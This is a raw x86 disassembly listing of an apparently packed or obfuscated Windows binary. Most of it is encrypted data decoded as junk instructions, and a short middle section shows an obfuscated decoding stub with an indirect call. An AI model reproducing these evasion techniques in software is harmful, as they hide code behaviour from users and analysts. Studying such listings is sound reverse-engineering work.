  40cd7c:	jne    0x40cdc8
  40cd7e:	sahf   
  40cd7f:	pop    edx
  40cd80:	or     eax,0x23fca357
  40cd85:	sbb    dl,BYTE PTR [eax+0x7]
  40cd88:	or     BYTE PTR [esi],bh
  40cd8a:	ds cmp esi,ecx
  40cd8d:	clc    
  40cd8e:	push   ds
  40cd8f:	inc    eax
  40cd90:	push   cs
  40cd91:	xchg   ebx,eax
  40cd92:	cmp    ch,ah
  40cd94:	test   DWORD PTR [ecx+0x1a6926f1],ebx
  40cd9a:	sbb    esi,DWORD PTR [edi+0x56e69c61]
  40cda0:	lahf   
  40cda1:	data16 in al,dx
  40cda3:	pusha  
  40cda4:	adc    eax,0x52b2372f
  40cda9:	(bad)  
  40cdab:	inc    eax
  40cdac:	icebp  
  40cdad:	(bad)  
  40cdae:	adc    dl,BYTE PTR [esi+0x33]
  40cdb1:	out    0xa0,eax
  40cdb3:	into   
  40cdb4:	pop    ebx
  40cdb5:	hlt    
  40cdb6:	cmp    DWORD PTR cs:[eax-0x22263d77],edx
  40cdbd:	in     eax,dx
  40cdbe:	mov    ecx,esp
  40cdc0:	fdiv   st(1),st
  40cdc2:	out    0x53,eax
  40cdc4:	or     esp,ecx
  40cdc6:	outs   dx,DWORD PTR ds:[esi]
  40cdc7:	fadd   DWORD PTR ss:[edx]
  40cdca:	dec    eax
  40cdcb:	outs   dx,DWORD PTR ds:[esi]
  40cdcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdcd:	cs inc edi
  40cdcf:	int    0x19
  40cdd1:	push   esi
  40cdd2:	(bad)  
  40cdd3:	retf   
  40cdd4:	push   eax
  40cdd5:	and    eax,0xb3d98e49
  40cdda:	pop    ebx
  40cddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cddc:	ja     0x40cdcf
  40cdde:	cwde   
  40cddf:	repnz xor eax,0x4c9ef0ae
  40cde5:	sub    DWORD PTR [ecx+0x56],0x75
  40cde9:	dec    ebp
  40cdea:	leave  
  40cdeb:	xchg   ebx,eax
  40cdec:	ret    
  40cded:	sar    BYTE PTR [edx+0x78],0xf5
  40cdf1:	inc    ecx
  40cdf2:	les    edx,FWORD PTR [ebx]
  40cdf4:	jle    0x40cda8
  40cdf6:	dec    edx
  40cdf7:	jmp    0x63de:0x39cf283f
  40cdfe:	test   eax,0x23a71bbb
  40ce03:	or     al,0x11
  40ce05:	aam    0x64
  40ce07:	add    BYTE PTR [edx+0x7d],dh
  40ce0a:	or     bh,BYTE PTR [ecx+edi*8-0x72]
  40ce0e:	add    al,0x42
  40ce10:	pusha  
  40ce11:	lock addr16 jne 0x40ce41
  40ce15:	jmp    0x9396023d
  40ce1a:	test   DWORD PTR [ecx+0x419cf042],edx
  40ce20:	jecxz  0x40cdb2
  40ce22:	call   0xd3df:0x23212f52
  40ce29:	jecxz  0x40ce7d
  40ce2b:	(bad)  
  40ce2c:	dec    ebx
  40ce2d:	mov    dh,0x1d
  40ce2f:	xor    bl,dh
  40ce31:	test   al,0x92
  40ce33:	jecxz  0x40ceac
  40ce35:	inc    edx
  40ce36:	pusha  
  40ce37:	shr    edi,0x7b
  40ce3a:	sbb    al,0xd4
  40ce3c:	jg     0x40cdd8
  40ce3e:	or     DWORD PTR [ebp+0x39ffde69],esi
  40ce44:	inc    esi
  40ce45:	mov    ebx,ss
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c66
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42386a
  40cf91:	push   0x423822
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a86
  40cff7:	mov    ebx,DWORD PTR ds:0x421aae
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c66
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cea
  40d0ed:	mov    esi,DWORD PTR ds:0x421ce2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ce2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	dec    ecx
  40d112:	test   BYTE PTR [esi],bh
  40d114:	loopne 0x40d0d8
  40d116:	shl    DWORD PTR [edx+0x62],1
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx-0x20]
  40d11e:	xor    BYTE PTR [ebx-0x2aafe3c5],cl
  40d124:	cmp    BYTE PTR [ebx+0x5c],ch
  40d127:	mov    al,ds:0x5550de79
  40d12c:	or     edi,ebp
  40d12e:	fwait
  40d12f:	pop    esi
  40d130:	popf   
  40d131:	pusha  
  40d132:	psadbw mm6,QWORD PTR [ecx-0x413c89b4]
  40d139:	and    DWORD PTR [ecx+0x47],esp
  40d13c:	pop    ecx
  40d13d:	adc    bh,bh
  40d13f:	or     ebp,0x70d15beb
  40d145:	push   esp
  40d146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d147:	je     0x40d0d5
  40d149:	push   es
  40d14a:	sub    bh,bh
  40d14c:	push   ebx
  40d14d:	dec    esp
  40d14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d14f:	pushf  
  40d150:	jecxz  0x40d134
  40d152:	push   edi
  40d153:	jo     0x40d128
  40d155:	sub    edx,ebp
  40d157:	not    BYTE PTR ds:[edi-0x1e85c532]
  40d15e:	jno    0x40d129
  40d160:	adc    BYTE PTR [esi-0x12],0xaf
  40d164:	rcr    DWORD PTR [ebx+0x10e9e041],cl
  40d16a:	fstp   DWORD PTR [ebx-0x2b5f68e]
  40d170:	into   
  40d171:	sahf   
  40d172:	add    al,0x93
  40d174:	es popf 
  40d176:	hlt    
  40d177:	(bad)  
  40d17a:	in     eax,dx
  40d17b:	cli    
  40d17c:	xchg   ebp,eax
  40d17d:	and    edi,eax
  40d17f:	mov    ecx,0xcc5d7404
  40d184:	es je  0x40d124
  40d187:	imul   ebx,eax,0xf9154224
  40d18d:	les    esp,FWORD PTR [eax+0x73]
  40d190:	push   0x6d1073c8
  40d195:	mov    dh,0xf6
  40d197:	and    ebx,DWORD PTR [edx]
  40d199:	cmp    bl,BYTE PTR ds:0xe7ea2dd7
  40d19f:	add    bl,BYTE PTR [edi-0x71]
  40d1a2:	jp     0x40d1ab
  40d1a4:	pushf  
  40d1a5:	(bad)  
  40d1a6:	sti    
  40d1a7:	dec    eax
  40d1a8:	int3   
  40d1a9:	loop   0x40d1af
  40d1ab:	outs   dx,DWORD PTR ds:[esi]
  40d1ac:	pop    ebx
  40d1ad:	fnstenv [edx]
  40d1af:	xor    bh,ch
  40d1b1:	rcr    DWORD PTR [ebx],cl
  40d1b3:	lods   al,BYTE PTR ds:[esi]
  40d1b4:	cmp    ebx,edi
  40d1b6:	push   esp
  40d1b7:	push   esi
  40d1b8:	mov    WORD PTR [esi+0x62e4f17f],?
  40d1be:	and    edi,DWORD PTR [ebx+0x21]
  40d1c1:	in     al,dx
  40d1c2:	addr16 mov ah,0xe7
  40d1c5:	arpl   WORD PTR [edi-0x2a],sp
  40d1c8:	int3   
  40d1c9:	mov    ds:0x8a0079df,eax
  40d1ce:	(bad)  
  40d1cf:	(bad)  
  40d1d0:	outs   dx,DWORD PTR ds:[esi]
  40d1d1:	es clc 
  40d1d3:	lock (bad) 
  40d1d5:	scas   eax,DWORD PTR es:[edi]
  40d1d6:	mov    dh,0x83
  40d1d8:	pop    es
  40d1d9:	or     edx,DWORD PTR [esi+ecx*2-0x58]
  40d1dd:	mov    eax,0x496cf102
  40d1e2:	and    dl,BYTE PTR [esi-0x37]
  40d1e5:	jae    0x40d1e1
  40d1e7:	iret   
  40d1e8:	mov    ecx,DWORD PTR [edi+0x68857af]
  40d1ee:	and    DWORD PTR [edi+0x7e],esp
  40d1f1:	xor    BYTE PTR [ebx-0x72f31502],ah
  40d1f7:	lock mov WORD PTR [esi],ss
  40d1fa:	int    0xaf
  40d1fc:	xchg   esi,eax
  40d1fd:	sbb    bl,BYTE PTR [eax-0x6a]
  40d200:	out    dx,eax
  40d201:	int3   
  40d202:	(bad)  
  40d203:	mov    WORD PTR [ebx+0x63],ss
  40d206:	ds loop 0x40d1a5
  40d209:	push   edx
  40d20a:	xchg   ebp,eax
  40d20b:	sbb    edx,0x40642fb
  40d211:	aad    0x88
  40d213:	ret    
  40d214:	mov    esp,0x8ab05e48
  40d219:	ins    DWORD PTR es:[edi],dx
  40d21a:	sub    DWORD PTR [edx],ebx
  40d21c:	pushw  0xffad
  40d21f:	cmc    
  40d220:	push   ds
  40d221:	stos   DWORD PTR es:[edi],eax
  40d222:	adc    al,0xf7
  40d224:	aaa    
  40d225:	or     ch,BYTE PTR [ebx]
  40d227:	sbb    al,0x3f
  40d229:	ins    DWORD PTR es:[edi],dx
  40d22a:	dec    esp
  40d22b:	div    DWORD PTR [edi]
  40d22d:	shl    BYTE PTR [ebp-0x64],0xf4
  40d231:	xchg   BYTE PTR [esi+0x62],al
  40d234:	aas    
  40d235:	pop    DWORD PTR [edx+0x5]
  40d238:	imul   eax,DWORD PTR [ebp+0x1f443b55],0xcfbd64b7
  40d242:	popa   
  40d243:	lods   al,BYTE PTR ds:[esi]
  40d244:	mov    eax,ds:0xc269ea5d
  40d249:	out    dx,al
  40d24a:	aad    0x29
  40d24c:	aam    0x2a
  40d24e:	push   edi
  40d24f:	lock mov dl,0x6
  40d252:	lea    esi,[edi]
  40d254:	or     BYTE PTR [ebp+0x2cd15003],0x7d
  40d25b:	xchg   ebp,eax
  40d25c:	dec    eax
  40d25d:	sbb    BYTE PTR [ecx],dh
  40d25f:	sub    ah,bh
  40d261:	enter  0xc947,0xf8
  40d265:	lock inc edx
  40d267:	pusha  
  40d268:	jg     0x40d278
  40d26a:	stos   BYTE PTR es:[edi],al
  40d26b:	jecxz  0x40d25c
  40d26d:	sar    dh,cl
  40d26f:	lods   al,BYTE PTR ds:[esi]
  40d270:	adc    ecx,eax
  40d272:	jbe    0x40d231
  40d274:	xchg   DWORD PTR [ecx+0x25a9be5b],ecx
  40d27a:	ds sahf 
  40d27c:	(bad)  
  40d27d:	adc    al,0x57
  40d27f:	sbb    dl,BYTE PTR [ecx+0x12]
  40d282:	or     eax,0x3ff40c21
  40d287:	push   edx
  40d288:	cmp    ecx,DWORD PTR [edi]
  40d28a:	inc    ebp
  40d28b:	jae    0x40d2c9
  40d28d:	fistp  QWORD PTR [edx+ebp*4+0x257e9e37]
  40d294:	(bad)  
  40d295:	push   gs
  40d297:	add    al,0x13
  40d299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d29a:	push   ebx
  40d29b:	outs   dx,BYTE PTR ds:[esi]
  40d29c:	mov    bl,0xba
  40d29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d29f:	push   cs
  40d2a0:	std    
  40d2a1:	mov    eax,0x1723452d
  40d2a6:	and    edi,edx
  40d2a8:	cmp    edx,DWORD PTR [esi-0x4d37143d]
  40d2ae:	fnstcw WORD PTR [ecx-0x73]
  40d2b1:	sub    eax,DWORD PTR [ecx-0x7f]
  40d2b4:	mov    WORD PTR [eax-0x60],cs
  40d2b7:	jge    0x40d290
  40d2b9:	(bad)  
  40d2ba:	push   edx
  40d2bb:	mov    es,ebp
  40d2bd:	jmp    0x40d2b5
  40d2bf:	or     dh,dl
  40d2c1:	(bad)  
  40d2c2:	cli    
  40d2c3:	jmp    0x4dee:0x5d8508ac
  40d2ca:	loop   0x40d29a
  40d2cc:	inc    ebx
  40d2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ce:	xor    al,0x60
  40d2d0:	and    BYTE PTR ds:0x12113b1e,dh
  40d2d6:	test   DWORD PTR [edx+0x219ef7e6],eax
  40d2dc:	nop
  40d2dd:	fld    DWORD PTR [esi]
  40d2df:	inc    edi
  40d2e0:	cmp    cl,al
  40d2e2:	xor    DWORD PTR [edi],esp
  40d2e4:	push   eax
  40d2e5:	outs   dx,DWORD PTR ds:[esi]
  40d2e6:	test   BYTE PTR [ebx-0x73],dl
  40d2e9:	cmp    dl,BYTE PTR [edi-0x8]
  40d2ec:	(bad)  
  40d2ed:	lock lds ecx,FWORD PTR [ecx-0x18]
  40d2f1:	nop
  40d2f2:	push   esi
  40d2f3:	cmp    DWORD PTR [ebp-0x775a40f3],esi
  40d2f9:	adc    DWORD PTR [eax-0x38],ebp
  40d2fc:	pushf  
  40d2fd:	popf   
  40d2fe:	sar    DWORD PTR [ecx],1
  40d300:	lea    ecx,[edi+eiz*4+0x75]
  40d304:	loope  0x40d367
  40d306:	out    dx,al
  40d307:	or     al,0x56
  40d309:	push   ds
  40d30a:	push   ss
  40d30b:	cmp    eax,DWORD PTR [edi]
  40d30d:	pop    ss
  40d30e:	into   
  40d30f:	lods   eax,DWORD PTR ds:[esi]
  40d310:	or     DWORD PTR [esi+0x52],edx
  40d313:	imul   edi,ecx,0xeaccbd58
  40d319:	ret    
  40d31a:	adc    BYTE PTR [esi],0xcb
  40d31d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d31e:	jns    0x40d359
  40d320:	xor    ebp,DWORD PTR [ebp-0x20eb7e89]
  40d326:	jp     0x40d380
  40d328:	sbb    esi,DWORD PTR [edi]
  40d32a:	dec    edi
  40d32b:	xor    edx,eax
  40d32d:	sub    eax,0x5f0d5a61
  40d332:	cmp    al,0x82
  40d334:	ret    0x9cae
  40d337:	add    DWORD PTR [ebx+0x710e41e],0xffffffe0
  40d33e:	add    ah,BYTE PTR [ebp+0x62]
  40d341:	xor    al,0x23
  40d343:	das    
  40d344:	ins    DWORD PTR es:[edi],dx
  40d345:	push   ecx
  40d346:	xor    cl,dl
  40d348:	sar    BYTE PTR [ecx+0x20],1
  40d34b:	lock test BYTE PTR [esi-0x790263f1],0x12
  40d353:	bound  ebp,QWORD PTR [eax]
  40d355:	jecxz  0x40d303
  40d357:	pop    edx
  40d358:	pop    es
  40d359:	pop    ss
  40d35a:	mov    ch,BYTE PTR [edi-0xaa56c50]
  40d360:	cs ins BYTE PTR es:[edi],dx
  40d362:	xchg   ebp,eax
  40d363:	xchg   esp,eax
  40d364:	mov    ebx,cs
  40d366:	cmp    ch,al
  40d368:	hlt    
  40d369:	pop    edx
  40d36a:	imul   eax,DWORD PTR [eax+0x78812b17],0x91b8ea22
  40d374:	dec    ebx
  40d375:	pop    esp
  40d376:	pop    edx
  40d377:	jbe    0x40d352
  40d379:	bound  esi,QWORD PTR [edx+ebp*1-0x2]
  40d37d:	dec    ebx
  40d37e:	ja     0x40d3cc
  40d380:	and    eax,0xed3b52f0
  40d385:	not    BYTE PTR [esi-0x53]
  40d388:	jge    0x40d3c7
  40d38a:	inc    esi
  40d38b:	adc    eax,0x2a23341f
  40d390:	lahf   
  40d391:	mov    eax,ds:0x22b0bf68
  40d396:	jp     0x40d3cd
  40d398:	xchg   ecx,eax
  40d399:	push   ebx
  40d39a:	scas   al,BYTE PTR es:[edi]
  40d39b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39c:	repnz scas eax,DWORD PTR es:[edi]
  40d39e:	ins    DWORD PTR es:[edi],dx
  40d39f:	pop    esp
  40d3a0:	add    bl,dl
  40d3a2:	inc    edx
  40d3a3:	sbb    al,0xe8
  40d3a5:	fs aas 
  40d3a7:	das    
  40d3a8:	mov    DWORD PTR [edx],esp
  40d3aa:	dec    ebx
  40d3ab:	lds    edi,FWORD PTR [ebx-0x66]
  40d3ae:	outs   dx,DWORD PTR ds:[esi]
  40d3af:	in     al,0x4d
  40d3b1:	loopne 0x40d378
  40d3b3:	mov    bl,0x7
  40d3b5:	lock push eax
  40d3b7:	push   es
  40d3b8:	mov    bh,0x64
  40d3ba:	jecxz  0x40d3d5
  40d3bc:	inc    ebx
  40d3bd:	sub    DWORD PTR [ecx+0x53],0x59e25458
  40d3c4:	or     BYTE PTR [esi+0x54],dl
  40d3c7:	or     al,BYTE PTR [edi]
  40d3c9:	sub    al,0x7e
  40d3cb:	repnz pop ds
  40d3cd:	mov    ds:0xe168effa,al
  40d3d2:	ja     0x40d3da
  40d3d4:	inc    eax
  40d3d5:	dec    ecx
  40d3d6:	cmp    edx,DWORD PTR [ebx+0x56f499c7]
  40d3dc:	mov    bh,0x4
  40d3de:	cmp    DWORD PTR [ecx],edi
  40d3e0:	(bad)  
  40d3e1:	push   edx
  40d3e2:	je     0x40d3ec
  40d3e4:	xor    BYTE PTR [eax+edx*1],ch
  40d3e7:	ror    DWORD PTR [edi],cl
  40d3e9:	push   ecx
  40d3ea:	inc    ebx
  40d3eb:	mov    DWORD PTR [eax-0x75f8f697],0xba3c873d
  40d3f5:	mov    edi,?
  40d3f7:	fst    QWORD PTR [eax+0x32]
  40d3fa:	inc    ebp
  40d3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3fc:	lods   eax,DWORD PTR ds:[esi]
  40d3fd:	sbb    esp,0xffffffc6
  40d400:	data16 sub BYTE PTR [edi-0x30],0x67
  40d405:	mov    dh,BYTE PTR [edx-0x16]
  40d408:	int    0xf3
  40d40a:	shl    DWORD PTR [eax+0xb4d6c98],0xa5
  40d411:	data16 (bad) 
  40d413:	bound  esi,QWORD PTR [edi-0x20ce2bcd]
  40d419:	xchg   ecx,eax
  40d41a:	pop    esi
  40d41b:	(bad)  
  40d41d:	icebp  
  40d41e:	repnz lds ecx,FWORD PTR [ebx-0x55]
  40d422:	mov    ss,WORD PTR [ebp+0x1c134a0]
  40d428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d429:	call   0x21b4:0x92d86d33
  40d430:	les    ebx,FWORD PTR [ebx]
  40d432:	and    esi,edi
  40d434:	sar    DWORD PTR [ebx-0x2363b85],cl
  40d43a:	call   0x3922a95
  40d43f:	gs repnz xor al,0x5d
  40d443:	mov    cl,0xda
  40d445:	(bad)  
  40d446:	mov    al,ds:0xdd9f919
  40d44b:	push   0x2f89cab3
  40d450:	div    BYTE PTR [bp+di-0x2887]
  40d455:	fistp  WORD PTR [edx+0x16aabe19]
  40d45b:	fisubr WORD PTR [edi+0x8afc690]
  40d461:	ins    DWORD PTR es:[edi],dx
  40d462:	stos   BYTE PTR es:[edi],al
  40d463:	jl     0x40d404
  40d465:	in     al,dx
  40d466:	in     eax,dx
  40d467:	jns    0x40d424
  40d469:	sbb    edi,esp
  40d46b:	int    0x75
  40d46d:	(bad)  
  40d46e:	int3   
  40d46f:	mov    ch,0x53
  40d471:	scas   al,BYTE PTR es:[edi]
  40d472:	inc    esi
  40d473:	ret    0xc013
  40d476:	push   0x67c5190
  40d47b:	xor    eax,0x80cd0fb3
  40d480:	jmp    0xbf8d:0xde833a21
  40d487:	mov    bh,0x1
  40d489:	mov    ebx,0x320adc28
  40d48e:	pop    eax
  40d48f:	jne    0x40d4f9
  40d491:	(bad)  [edx+0x35]
  40d494:	div    dl
  40d496:	lods   eax,DWORD PTR ds:[esi]
  40d497:	add    esp,0xffffffcf
  40d49a:	pop    eax
  40d49b:	icebp  
  40d49c:	jb     0x40d43e
  40d49e:	push   esi
  40d49f:	ror    eax,0x1f
  40d4a2:	and    DWORD PTR [eax+0x242637db],ecx
  40d4a8:	les    ecx,FWORD PTR [esi]
  40d4aa:	adc    edi,DWORD PTR [ecx-0x7]
  40d4ad:	xchg   ebp,eax
  40d4ae:	mov    eax,0x6f94395e
  40d4b3:	aad    0x65
  40d4b5:	push   ebp
  40d4b6:	enter  0x2ccb,0x5c
  40d4ba:	jmp    0x40d4a8
  40d4bc:	gs mov dl,0xdb
  40d4bf:	jnp    0x40d4b6
  40d4c1:	fimul  DWORD PTR [ebx]
  40d4c3:	hlt    
  40d4c4:	mov    ecx,0x44a58567
  40d4c9:	out    0x1e,eax
  40d4cb:	ss (bad) 
  40d4cd:	adc    esp,DWORD PTR [esi-0x2b]
  40d4d0:	scas   eax,DWORD PTR es:[edi]
  40d4d1:	rcr    DWORD PTR [ebx+eax*4+0x442643f5],1
  40d4d8:	sub    BYTE PTR [ebp+0x22bac98f],0xf3
  40d4df:	add    al,0xea
  40d4e1:	pop    ebp
  40d4e2:	outs   dx,DWORD PTR ds:[esi]
  40d4e3:	cmp    bl,0x33
  40d4e6:	mov    ds:0x10a3608d,eax
  40d4eb:	adc    eax,0xf0b4d33
  40d4f0:	je     0x40d4cb
  40d4f2:	or     BYTE PTR [eax],bl
  40d4f4:	dec    ecx
  40d4f5:	out    0x3d,eax
  40d4f7:	add    BYTE PTR [edx-0x2ef9dfae],dl
  40d4fd:	(bad)  
  40d4fe:	popf   
  40d4ff:	stos   BYTE PTR es:[edi],al
  40d500:	int3   
  40d501:	imul   BYTE PTR [ecx]
  40d503:	fistp  DWORD PTR [ebp+eax*1-0x56]
  40d507:	sbb    al,0x64
  40d509:	ins    BYTE PTR es:[edi],dx
  40d50a:	jl     0x40d584
  40d50c:	inc    esp
  40d50d:	or     al,0xd4
  40d50f:	mov    ebp,0x190cb65d
  40d514:	mov    dl,0x11
  40d516:	out    0x3d,al
  40d518:	data16 test BYTE PTR [edx+0xf],dh
  40d51c:	xchg   edi,eax
  40d51d:	aam    0xf5
  40d51f:	shl    DWORD PTR [esi+0x153ea0bb],0xbc
  40d526:	icebp  
  40d527:	cld    
  40d528:	mov    bl,0xc4
  40d52a:	bound  edx,QWORD PTR [esi]
  40d52c:	or     esi,DWORD PTR [esp+edi*8-0x5d]
  40d530:	jp     0x40d4b7
  40d532:	test   DWORD PTR [ecx+0x4bd82068],eax
  40d538:	lahf   
  40d539:	jecxz  0x40d5a0
  40d53b:	je     0x40d552
  40d53d:	iret   
  40d53e:	stos   BYTE PTR es:[edi],al
  40d53f:	les    ecx,FWORD PTR [eax+0x3d8f2dc1]
  40d545:	inc    edx
  40d546:	das    
  40d547:	pop    ds
  40d548:	mul    DWORD PTR [ecx+eiz*2-0x9]
  40d54c:	or     al,BYTE PTR [edi+ebp*1-0x5eb1e3fd]
  40d553:	daa    
